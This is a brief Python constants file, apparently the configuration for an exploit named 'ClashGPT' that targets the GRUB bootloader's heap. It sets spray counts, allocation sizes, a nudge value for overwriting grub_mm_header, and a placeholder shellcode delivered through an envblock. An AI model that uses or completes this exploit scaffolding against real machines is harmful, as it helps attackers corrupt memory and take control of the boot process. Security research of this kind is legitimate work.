BANNER = 'ClashGPT - bah / January 2025'

# grub_env_var hash values.
HASHSZ = 13
HASHVAL_SPRAY = 1

BLOCK_SIZE = 512
GPT_PARTITION_TYPE = 0xee

# depth to use to test if we corrupted the right object
PROBE_DEPTH = 128
# start / end depth to check
START_DEPTH = 150
END_DEPTH = 160

MAX_DEPTH = END_DEPTH + 32

# how many functions to try to vary the depth
FUN_COUNT = 4

# the construction we are targetting is two 32kb allocations next to each other
# need to nudge this slightly to get our controlled value over the
# grub_mm_header
NUDGE = 0
TRASH_ALLOC = ((32 * 1024) + NUDGE) * 'Z'

# how many 32KB allocations to spray.
SPRAY_CONSTRUCTION = 64

# how many struct grub_env_var's we want to spray
SPRAY_ENVVAR = 1024

# this gets sprayed via an envblock.
# supports all characters except 0x00 and 0x0a.
SHELLCODE = b'\xeb\xfe' * 16
